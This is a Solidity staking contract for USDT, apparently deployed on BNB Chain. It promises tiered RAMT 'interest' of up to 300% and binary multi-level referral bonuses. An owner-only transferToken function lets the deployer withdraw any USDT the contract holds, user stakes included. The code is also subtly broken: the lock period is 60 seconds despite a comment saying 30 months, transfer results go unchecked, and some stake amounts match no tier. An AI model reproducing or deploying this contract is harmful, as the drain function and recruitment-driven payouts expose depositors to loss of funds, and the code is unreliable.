/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

// File: contracts/BItBrick/Staking Project.sol


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;


interface IERC20{
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract StakeUSDT {

    IERC20 USDT;
    IERC20 RAMT;
    address public owner;

    // 30 Days (30 * 24 * 60 * 60)
    uint256 public oneMonthTime = 2592000;
    // Package 1: 30 Months (30 * 30 * 24 * 60 * 60)
    uint256 public package1Time = 2 * 30;
    // Package 2: 25 Months (25 * 30 * 24 * 60 * 60)
    uint256 public package2Time = 2592000 * 25;
    // Package 3: 20 Months (20 * 30 * 24 * 60 * 60)
    uint256 public package3Time = 2592000 * 20;
    // Package 4: 16 Months (16 * 30 * 24 * 60 * 60)
    uint256 public package4Time = 2592000 * 16;
    // Package 5: 13 Months (13 * 30 * 24 * 60 * 60)
    uint256 public package5Time = 2592000 * 13;
    // Package 6: 10 Months (10 * 30 * 24 * 60 * 60)
    uint256 public package6Time = 2592000 * 10;

    //uint256 public interestRate1 (50 < 600) = 30 * ((10 * amount)/ 100) ;
    //uint256 public interestRate2 (600 < 1100) = 25 * ((12 * amount)/ 100) ;
    //uint256 public interestRate3 (1100 < 3100) = 20 * ((15 * amount)/ 100) ;
    //uint256 public interestRate4 (3100 < 5100) = 16 * ((18 * amount)/ 100) ;
    //uint256 public interestRate5 (5100 < 11000) = 13 * (((22 + (1/2)) * amount)/ 100) ;
    //uint256 public interestRate6 (11000 >) = 10 * ((30 * amount)/ 100) ;

    //uint256 public designationReward1 (1100 < 3100) = 100RAMT;
    //uint256 public designationReward1 (3100 < 5100) = 200RAMT;
    //uint256 public designationReward1 (5100 < 11000) = 500RAMT;
    //uint256 public designationReward1 (11000 < 21000) = 1000RAMT;
    //uint256 public designationReward1 (21000>) = 1500RAMT;
    

    // 180 Days (180 * 24 * 60 * 60)
    //uint256 _planExpired = 15552000;

    uint8 public totalStakers;

    struct StakeInfo { 
               
        uint256 startTime;
        uint256 endTime;        
        uint256 amount;
        uint256 package1_to_6;
        uint256 interestAmount;
        uint256 designationRank;
        uint256 designationReward;
        bool staked;
        bool claimed;       
    }

    struct referralInfo{
        address referredBy;
        address referredToA;
        uint256 stakingAmountOfA;
        uint256 referralRewardA;
        address referredToB;
        uint256 stakingAmountOfB;
        uint256 referralRewardB;
        uint256 binaryReward;
        uint256 businessReward;
        uint256 myReferrals;
    }
    
    event Staked(address indexed from, uint256 amount);
    event Claimed(address indexed from, uint256 amount);
    
    mapping(address => StakeInfo) public stakeInfos;
    mapping(address => referralInfo) public referralInfos;



    constructor(IERC20 _tokenAddressA, IERC20 _tokenAddressB) {
        require(((address(_tokenAddressA) != address(0))&& (address(_tokenAddressB) != address(0))),"Token Address cannot be address 0");                
        USDT = _tokenAddressA;
        RAMT = _tokenAddressB;        
        totalStakers = 0;
        owner=msg.sender;
    }

    //modifiers
    //only admin
    modifier onlyOwner(){
        require(msg.sender == owner, "Not owner");
        _;
    }    

    function transferToken(address to,uint256 amount) external onlyOwner{
        require(USDT.transfer(to, amount), "Token transfer failed!");  
    }

    function claimReward() external returns (bool){
        require(stakeInfos[msg.sender].staked == true, "You are not a participant");
        require(stakeInfos[msg.sender].endTime < block.timestamp, "Stake Time is not over yet");
        require(stakeInfos[msg.sender].claimed == false, "Already claimed");

        uint256 stakeAmount = stakeInfos[msg.sender].amount;
        uint256 interestAmount = stakeInfos[msg.sender].interestAmount;
        uint256 totalTokens = stakeAmount + interestAmount;
        stakeInfos[msg.sender].claimed = true;
        stakeInfos[msg.sender].staked = false;
        USDT.transfer(msg.sender, stakeAmount);
        RAMT.transfer(msg.sender, interestAmount);

        emit Claimed(msg.sender, totalTokens);

        return true;
    }

    function getTokenExpiry() external view returns (uint256) {
        require(stakeInfos[msg.sender].staked == true, "You are not a participant");
        return stakeInfos[msg.sender].endTime;
    }

    function stakeToken(
        address _referredBy,
        uint256 stakeAmount)
        external
        payable
    {
        require(stakeAmount >= 20, "Min stake Amount is 20$");
        require(stakeInfos[msg.sender].staked == false, "You already participated");
        require(USDT.balanceOf(msg.sender) >= stakeAmount, "Insufficient Balance");
        uint256 minReferralStakingAmount;
        if((_referredBy !=address(0)) && (referralInfos[_referredBy].referredToA != msg.sender) && (referralInfos[_referredBy].referredToB != msg.sender))
        {
            referralInfos[msg.sender].referredBy = _referredBy;
            if(referralInfos[_referredBy].myReferrals == 0)
            {
                referralInfos[_referredBy].referredToA = msg.sender;
                referralInfos[_referredBy].stakingAmountOfA = stakeAmount;
                referralInfos[_referredBy].referralRewardA = ((10 * stakeAmount)/ 100);
                RAMT.transfer(_referredBy, referralInfos[_referredBy].referralRewardA);
                referralInfos[_referredBy].myReferrals += 1;
            }
            else if(referralInfos[_referredBy].myReferrals == 1)
            {
                referralInfos[_referredBy].referredToB = msg.sender;
                referralInfos[_referredBy].stakingAmountOfB = stakeAmount;
                referralInfos[_referredBy].referralRewardB = ((10 * stakeAmount)/ 100);
                RAMT.transfer(_referredBy, referralInfos[_referredBy].referralRewardB);
                if(referralInfos[_referredBy].stakingAmountOfA == stakeAmount)
                {
                    minReferralStakingAmount = stakeAmount;
                }
                else if(referralInfos[_referredBy].stakingAmountOfA < stakeAmount)
                {
                    minReferralStakingAmount = referralInfos[_referredBy].stakingAmountOfA;
                }
                else
                {
                    minReferralStakingAmount = stakeAmount;
                }
                referralInfos[_referredBy].binaryReward = ((10 * minReferralStakingAmount)/ 100);
                RAMT.transfer(_referredBy, referralInfos[_referredBy].binaryReward);
                referralInfos[_referredBy].myReferrals += 1;
            }
            else
            {
                referralInfos[msg.sender].referredBy = referralInfos[_referredBy].referredToA;
                referralInfos[_referredBy].myReferrals += 1;
                if(referralInfos[referralInfos[_referredBy].referredToA].myReferrals == 0)
                {
                    referralInfos[referralInfos[_referredBy].referredToA].referredToA = msg.sender;
                    referralInfos[referralInfos[_referredBy].referredToA].stakingAmountOfA = stakeAmount;
                    referralInfos[referralInfos[_referredBy].referredToA].myReferrals += 1;
                }
                else if(referralInfos[referralInfos[_referredBy].referredToA].myReferrals == 1)
                {
                    referralInfos[referralInfos[_referredBy].referredToA].referredToB = msg.sender;
                    referralInfos[referralInfos[_referredBy].referredToA].stakingAmountOfB = stakeAmount;
                    referralInfos[referralInfos[_referredBy].referredToA].myReferrals += 1;
                }
                else
                {
                    referralInfos[referralInfos[_referredBy].referredToA].myReferrals += 1;
                }
            }
        }

        if(stakeAmount >= 50 && stakeAmount < 600)
        {
            USDT.transferFrom(msg.sender, address(this), stakeAmount);

            USDT.approve(address(this), 1000000000); 
            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 1;
            stakeInfos[msg.sender].interestAmount = 30 * ((10 * stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 0;
            stakeInfos[msg.sender].designationReward = 0;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            totalStakers++;
            emit Staked(msg.sender, stakeAmount);
        }
        else if (stakeAmount >= 600 && stakeAmount < 1100)
        {
            USDT.transferFrom(msg.sender, address(this), stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 2;
            stakeInfos[msg.sender].interestAmount = 25 * ((12 * stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 0;
            stakeInfos[msg.sender].designationReward = 0;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            totalStakers++;
            emit Staked(msg.sender, stakeAmount);
        }
        else if (stakeAmount >= 1100 && stakeAmount < 3100)
        {
            USDT.transferFrom(msg.sender, address(this), stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 3;
            stakeInfos[msg.sender].interestAmount = 20 * ((15 * stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 1;
            stakeInfos[msg.sender].designationReward = 100;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, stakeAmount);
        }
        else if (stakeAmount >= 3100 && stakeAmount < 5100)
        {
            USDT.transferFrom(msg.sender, address(this), stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 4;
            stakeInfos[msg.sender].interestAmount = 16 * ((18 * stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 2;
            stakeInfos[msg.sender].designationReward = 200;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, stakeAmount);
        }
        else if (stakeAmount >= 5100 && stakeAmount < 11000)
        {
            USDT.transferFrom(msg.sender, address(this), stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 5;
            stakeInfos[msg.sender].interestAmount = 13 * (((22) * stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 3;
            stakeInfos[msg.sender].designationReward = 500;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, stakeAmount);
        }
        else if (stakeAmount >= 11000 && stakeAmount < 21000)
        {
            USDT.transferFrom(msg.sender, address(this), stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 6;
            stakeInfos[msg.sender].interestAmount = 10 * ((30 * stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 4;
            stakeInfos[msg.sender].designationReward = 1000;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, stakeAmount);
        }
        else if (stakeAmount >= 21000)
        {
            USDT.transferFrom(msg.sender, address(this), stakeAmount);

            stakeInfos[msg.sender].startTime = block.timestamp;
            stakeInfos[msg.sender].endTime = block.timestamp + package1Time; 
            stakeInfos[msg.sender].amount = stakeAmount;
            stakeInfos[msg.sender].package1_to_6 = 6;
            stakeInfos[msg.sender].interestAmount = 10 * ((30 * stakeAmount)/ 100);
            stakeInfos[msg.sender].designationRank = 5;
            stakeInfos[msg.sender].designationReward = 1500;
            stakeInfos[msg.sender].staked = true;
            stakeInfos[msg.sender].claimed = false;

            RAMT.transfer(_referredBy, stakeInfos[msg.sender].designationReward);

            totalStakers++;
            emit Staked(msg.sender, stakeAmount);
        }

        if(minReferralStakingAmount>=5000 && minReferralStakingAmount<10000)
        {
            RAMT.transfer(_referredBy, 100);
        }
        else if (minReferralStakingAmount>=10000 && minReferralStakingAmount<15000)
        {
            RAMT.transfer(_referredBy, 250);
        }
        else if (minReferralStakingAmount>=15000 && minReferralStakingAmount<20000)
        {
            RAMT.transfer(_referredBy, 500);
        }
        else if (minReferralStakingAmount>=20000 && minReferralStakingAmount<25000)
        {
            RAMT.transfer(_referredBy, 1000);
        }
        else if (minReferralStakingAmount>=25000 && minReferralStakingAmount<30000)
        {
            RAMT.transfer(_referredBy, 1500);
        }
        else if (minReferralStakingAmount>=30000 && minReferralStakingAmount<100000)
        {
            RAMT.transfer(_referredBy, 2000);
        }
        else if (minReferralStakingAmount>=100000 && minReferralStakingAmount<300000)
        {
            RAMT.transfer(_referredBy, 2500);
        }
        else if (minReferralStakingAmount>=300000 && minReferralStakingAmount<500000)
        {
            RAMT.transfer(_referredBy, 6000);
        }
        else if (minReferralStakingAmount>=500000 && minReferralStakingAmount<1000000)
        {
            RAMT.transfer(_referredBy, 10000);
        }
        else if (minReferralStakingAmount>=1000000)
        {
            RAMT.transfer(_referredBy, 20000);
        }
    }    
}